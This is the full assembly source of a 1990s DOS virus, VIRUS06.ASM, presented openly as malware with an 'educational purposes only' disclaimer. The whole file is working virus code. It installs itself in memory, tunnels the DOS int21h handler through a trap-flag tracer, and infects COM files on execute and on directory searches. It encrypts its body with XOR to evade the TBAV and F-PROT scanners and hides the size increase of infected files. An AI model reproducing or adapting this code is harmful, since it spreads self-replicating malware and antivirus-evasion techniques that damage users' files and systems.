;
;	VIRUS06.ASM
;
;	Author: Johan Gardhage <johan.gardhage@gmail.com>
;	Originally written in 1995.
;
; Description:
; This virus is a resident infector of COM files, encrypted with an
; XOR algorithm. It uses tunneling to install the int21h handler.
;
; The virus infects on both execute (4b00h) and find first/next (11h/12h).
; If an infected file is being touched with the directory functions
; (11h/12h/4eh/4fh), the virus  will stealth the filesize.
;
; Disclaimer:
; I take no responsibility for any damage, either direct or implied,
; caused by the usage of this virus source code or of the resulting code
; after assembly. The code was written for educational purposes ONLY.
;

	.model tiny
	.code
	.startup
	locals @@

VirusSize	equ	EndVirus-BeginVirus
ParagraphSize	equ	VirusSize / 10h + 2
TimeStamp	equ	10001b				; Stealth marker
VirusInterrupt	equ	7979h
VirusIdentifier	equ	'bA'

BeginVirus:
	jmp	EntryPoint

;---------------------------------------------------------------------
;	Start of encrypted area
;---------------------------------------------------------------------

BeginEncryptedSection:
	mov	ax,VirusInterrupt			; Check if in mem
	int	21h
	cmp	ax,VirusIdentifier
	je	AlreadyResident

	mov	ah,4ah					; Get size of mem
	mov	bx,0FFFFh
	int	21h
	mov	ah,4ah					; Change size of mem
	sub	bx,ParagraphSize+1			; Make space for virus
	int	21h
	mov	ah,48h					; Allocate memory
	mov	bx,ParagraphSize
	int	21h
	sub	ax,10h					; Compensate org 100h
	mov	es,ax
	mov	di,100h
	lea	si,[bp+offset BeginVirus]
	mov	cx,VirusSize
	rep	movsb					; Copy virii to mem
	push	es
	pop	ds
	inc	byte ptr ds:[0f1h]			; Change block owner

	push	cs
	call	InstallInt21hHandler			; Jump to tunneler

AlreadyResident:
	mov	di,100h
	push	di					; Save di at 100h
	push	cs					; Make cs=ds=es
	push	cs
	pop	es
	pop	ds
	lea	si,[bp+OrgBuf]
	movsw						; Copy first bytes
	movsw
	ret						; Return

;---------------------------------------------------------------------
;	Install int21h handler
;---------------------------------------------------------------------

InstallInt21hHandler:
	push	ds					; Jump to tunneler in
	mov	ax,offset @@next1			; new memory
	push	ax
	retf

@@next1:mov	ah,52h					; Get list of lists
	int	21h
	mov	ax,es:[bx-2]				; Get first MCB
	mov	OrigMcb,ax

	mov	ax,3521h				; Get int21
	int	21h
	mov	Int21o,bx
	mov	Int21s,es

	mov	al,01h					; Save int01
	int	21h
	push	bx					; on stack
	push	es

	mov	ah,25h					; Set int01
	mov	dx,offset Int01hHandler
	int	21h

	pushf						; Set trap flag
	pop	ax
	or	ah,1
	push	ax
	popf

	mov	ah,0bh					; Issue dos function
	pushf						; Simulate interrupt
	call	dword ptr Int21o			; for tracing

	pop	ds
	pop	dx

	pushf						; Get flags
	pop	ax
	test	ah,1					; Check trap flag
	pushf
	and	ah,0feh					; Turn off trap flag
	push	ax
	popf

	mov	ax,2501h				; Reset int01
	int	21h

	push	cs
	pop	ds

	popf
	jnz	@@next2

	mov	ah,25h
	mov	dx,offset Int21hHandler
	int	21h
@@next2:retf

Int01hHandler:
	mov	cs:OrigAx,ax				; Save registers
	mov	cs:OrigSi,si
	mov	cs:OrigCx,cx
	pop	si					; Get ip in si
	pop	ax					; cs in ax
	pop	cx					; flags in cx
	push	ds
	mov	ds,ax
	cmp	word ptr [si],05eBh			; Check if tbav
	jne	@@next1
	cmp	byte ptr [si+2],0eah			; Check if tbav
	jne	@@next1
	inc	si					; Skip tbav
	inc	si
@@next1:cmp	byte ptr [si],9ah			; Immediate interseg?
	je	@@next3
	cmp	byte ptr [si],0eah			; Immediate interseg?
	je	@@next3
	cmp	word ptr [si],0ff2eh			; opc prefix=cs?
	jne	@@next2
	cmp	byte ptr [si+2],1eh			; Direct interseg?
	je	@@next4
	cmp	byte ptr [si+2],2eh			; Direct interseg?
	je	@@next4
@@next2:pop	ds
	push	cx
	push	ax
	push	si
	db	0b8h
OrigAx	dw	?
	db	0beh
OrigSi	dw	?
	db	0b9h
OrigCx	dw	?
	iret
@@next3:push	si
	inc	si
	jmp	@@next5
@@next4:push	si
	mov	si,si[3]
@@next5:db	81h,7ch,02h				; cmp ds:si[2], mcb
OrigMcb	dw	?					; See if jmp is to dos
	jnb	@@next6
	push	ax
	mov	ax,si[0]				; Get offset address
	mov	cs:Int21o,ax
	mov	ax,si[2]				; Get segment address
	mov	cs:Int21s,ax
	mov	si[0],offset Int21hHandler		; Install int21 handler
	mov	si[2],cs
	pop	ax
	and	ch,0feh					; Clear trap flag
@@next6:pop	si
	jmp	@@next2

;---------------------------------------------------------------------
;	New int 21h handler
;---------------------------------------------------------------------

Int21hHandler:
	cmp	ax,VirusInterrupt			; Return installation
	jne	@@next1
	mov	ax,VirusIdentifier
	iret
@@next1:cmp	ax,4b00h				; Execute?
	jne	@@next2
	jmp	InfectFileOnExecute
@@next2:cmp	ah,11h					; Stealth FCB
	je	StealthFindMatchingFileFCB
	cmp	ah,12h					; Stealth FCB
	je	StealthFindMatchingFileFCB
	cmp	ah,4eh					; Stealth Handle
	je	StealthFindMatchingFile
	cmp	ah,4fh					; Stealth Handle
	je	StealthFindMatchingFile

OldInt21h:
	db	0eah
Int21o	dw	?
Int21s	dw	?

;---------------------------------------------------------------------
;	FCB & Handle stealth (11h/12h & 4eh/4fh)
;---------------------------------------------------------------------

StealthFindMatchingFileFCB:				; 11h/12h
	pushf
	push	cs
	call	OldInt21h				; fake a call to old int handler
	or	al,al					; Check if a file was found
	jz	@@next1
	jmp	ErrorStealth
@@next1:pushf
	push	ax bx cx dx si di ds es

	mov	ax,6200h				; Get psp
	int	21h
	mov	es,bx
	cmp	bx,es:[16h]				; Ensure that dos is calling
	jne	SkipStealth

	mov	ah,2fh					; Get dta
	int	21h
	push	es					; ds:si to dta
	pop	ds

	cmp	byte ptr [bx],0ffh
	jne	@@next2
	add	bx,7
@@next2:mov	si,bx
	inc	si
	add	bx,3

	mov	ax,[bx+14h]				; get time stamp
	and	al,00011111b				; kill all but secs...
	xor	al,TimeStamp				; xor with our marker
	jz	DoStealth

	push	cs					; Convert to asciz
	pop	es
	mov	di,offset EndVirus
	mov	cx,8
@@loop1:lodsb
	cmp	al,' '
	je	@@next3
	stosb
	loop	@@loop1

@@next3:mov	ax,'C.'					; Append extension
	stosw
	mov	ax,'MO'
	stosw

	xor	al,al
	stosb
	mov	dx,offset EndVirus
	push	cs
	pop	ds
	call	InfectFile
	jmp	SkipStealth

StealthFindMatchingFile:				; 4e/4f
	pushf
	push	cs
	call	OldInt21h				; fake int call
	jc	ErrorStealth				; there was an error so don't stealth
							; (such as no files to find.. )
	pushf
	push	ax bx cx dx si di ds es

	mov	ah,2fh
	int	21h					; get dta addr., es:bx points to it...
	push	es
	pop	ds

	mov	ax,[bx+16h]				; get time stamp

	and	al,00011111b				; kill all but secs...
	xor	al,TimeStamp				; xor with our marker
	jnz	SkipStealth				; not ours :(

DoStealth:
	sub	word ptr [bx+1ah], VirusSize
	sbb	word ptr [bx+1ch], 0

SkipStealth:
	pop	es ds di si dx cx bx ax
	popf

ErrorStealth:
	retf	2

;---------------------------------------------------------------------
;	Infect on execute (4b00h)
;---------------------------------------------------------------------

InfectFileOnExecute:
	call	InfectFile
	jmp	OldInt21h

Infectfile:
	push	es bp ax bx cx si di ds dx

	mov	ax,3d00h				; open file
	int	21h
	xchg	ax,bx

	call	CheckSFT				; es:di+20h points to file name
	add	di,28h					; es:di points to extension
	cmp	word ptr es:[di],'OC'
	jne	@@next1
	cmp	byte ptr es:[di+2],'M'			; es:di+2 points to 3rd char in extension
	je	@@next2
@@next1:jmp	@@skip

@@next2:mov	byte ptr es:[di-26h],2

	mov	ax,4200h				; seek tof
	xor	cx,cx
	cwd
	int	21h

	push	cs					; cs=ds
	pop	ds

	mov	ax,5700h				; get time/date
	int	21h
	mov	Time,cx
	mov	Date,dx

	mov	ah,3fh					; read first four bytes to OrgBuf
	mov	cx,4
	mov	dx,offset ds:OrgBuf
	int	21h

	cmp	byte ptr ds:OrgBuf+3,'@'		; dont reinfect!
	je	@@skip

	mov	ax,4202h				; go end of file, offset in dx:cx
	xor	cx,cx					; and return file size in dx:ax.
	xor	dx,dx
	int	21h

	add	ax,offset EntryPoint-103h		; calculate entry offset to jmp
	mov	word ptr ds:NewBuf[1],ax		; move it [ax] to NewBuf

@@loop:	mov	ah,2ch					; get random number and put Key
	int	21h
	or	dl,dl					; dl=0 - get another value!
	je	@@loop
	mov	ds:Key,dx

	mov	ax,08d00h				; copy entire virus to 8d00h:100h
	mov	es,ax
	mov	di,100h
	mov	si,di
	mov	cx,(VirusSize+1)/2
	rep	movsw
	push	es
	pop	ds
	xor	bp,bp					; and encrypt it there
	call	EncryptDecrypt

	mov	ah,40h					; write virus to file from position
	mov	cx,VirusSize
	mov	dx,offset BeginVirus
	int	21h

	push	cs					; cs=ds
	pop	ds

	mov	ax,4200h				; go to beginning of file
	xor	cx,cx
	cwd
	int	21h

	mov	ah,40h					; and write a new-jmp-construct
	mov	cx,4					; of 4 bytes (4byte=infection marker)
	mov	dx,offset NewBuf
	int	21h

	mov	ax,5701h				; restore
	mov	dx,Date
	mov	cx,Time
	and	cl,11100000b				; zero sec's
	or	cl,TimeStamp				; mark with our infection marker
	int	21h

@@skip:	mov	ah,3eh					; Close file
	int	21h

	pop	dx ds di si cx bx ax bp es
	ret

;---------------------------------------------------------------------
;	Helper functions
;---------------------------------------------------------------------

CheckSFT:
	push	bx
	mov	ax,1220h				; Get job file table
	int	2fh					; for handle at es:di

	mov	ax,1216h				; Get system filetable
	mov	bl,byte ptr es:[di]			; for handle index
	int	2fh
	pop	bx
	ret

Time	dw	0
Date	dw	0

end_of_encryption:

;---------------------------------------------------------------------
;	End of encrypted section
;---------------------------------------------------------------------

EntryPoint:
	push	ax
	pop	ax
	push	ax
	pop	ax
	call	GetDelta
EncryptDecrypt:
	mov	dx,word ptr ds:[bp+Key]			; routine here to
	lea	si,[bp+BeginEncryptedSection]		; fool TBAV/F-PROT
	mov	cx,(end_of_encryption-BeginEncryptedSection)/2
@@loop:	xor	word ptr ds:[si],dx			; Simple xor-loop
	inc	si					; encryption
	inc	si
	loop	@@loop
	ret
Key	dw	0					; en/decrypt value
GetDelta:
	pop	bp
	sub	bp,offset EncryptDecrypt		; Get delta offset
	call	EncryptDecrypt				; Decrypt virus
	jmp	BeginEncryptedSection

NewBuf	db	0e9h,00h,00h,'@'			; New entry buffer
OrgBuf	db	0cdh,20h,00h,00h			; 4 byte buffer

filenameoffset	dw	0

EndVirus:

END